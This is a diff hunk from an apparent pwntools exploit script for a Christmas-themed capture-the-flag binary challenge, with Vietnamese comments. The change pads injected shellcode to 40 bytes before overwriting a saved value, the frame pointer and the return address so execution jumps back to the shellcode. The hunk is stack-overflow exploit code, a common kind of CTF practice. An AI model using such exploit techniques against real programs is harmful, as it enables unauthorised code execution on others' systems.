@@ -46,7 +46,7 @@ def exploit(p,elf,libc):
     p.recvuntil('Tell Santa what you want for XMAS\n')
     bss_addr -= 0x30 # quay lai dinh cua buffer
     payload = shellcode
-    payload += 'A'*13
+    payload = payload.ljust(40,"A")
     payload += p64(v5)
     payload += p64(bss_addr+0x30) # ebp  -> 1 gia tri bat ky
     payload += p64(bss_addr) # ret_ addr -> tro ve dinh stack
